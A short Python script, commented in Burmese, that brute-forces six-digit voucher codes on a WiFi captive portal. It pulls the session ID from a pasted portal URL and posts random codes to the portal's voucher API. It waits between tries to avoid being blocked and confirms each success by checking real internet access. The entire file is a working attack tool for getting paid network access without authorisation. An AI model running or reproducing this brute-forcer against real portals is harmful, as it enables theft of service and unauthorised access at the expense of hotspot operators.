import requests
import random
import time
import re

# အင်တာနက် တကယ်ရမရ စစ်မည့် Link
CHECK_URL = "http://connectivitycheck.gstatic.com/generate_204"

def check_internet():
    try:
        # Redirect မလုပ်ဘဲ တိုက်ရိုက်ခေါ်ကြည့်ပါ
        response = requests.get(CHECK_URL, timeout=3, allow_redirects=False)
        # Status 204 ဆိုလျှင် အင်တာနက် တကယ်ရနေခြင်းဖြစ်သည်
        return response.status_code == 204
    except:
        return False

def start_engine(sid, api_url):
    print(f"[*] Engine Started. Searching for WORKING vouchers...")
    
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        try:
            # ၁။ Login စမ်းကြည့်ခြင်း
            res = requests.post(api_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, timeout=5)
            
            # ၂။ Router က Success လို့ ညာရင်တောင် အင်တာနက် တကယ်ရမရ ထပ်စစ်ခြင်း
            if res.status_code == 200:
                print(f"[*] System accepted {code}. Verifying internet connection...", end="\r")
                time.sleep(1.5) # Router အပြောင်းအလဲအတွက် ခဏစောင့်ပါ
                
                if check_internet():
                    print(f"\n[+++] BINGO! REAL WORKING CODE FOUND: {code}")
                    print("[!] Internet is now ACTIVE.")
                    break
                else:
                    # Router က ညာနေလျှင် ဒီအတိုင်း ဆက်ပတ်ပါမည်
                    pass
            
            # Block မခံရအောင် Delay ထည့်ပါ
            time.sleep(2)
        except:
            time.sleep(5)

# URL ထည့်သွင်းရန် အပိုင်း (အစ်ကို့ URL ကို ဒီမှာ ထည့်ပါ)
url = input("Paste Portal URL: ")
sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
api_url = f"{url.split('?')[0].replace('index.html', '')}api/auth/voucher/"
start_engine(sid, api_url)
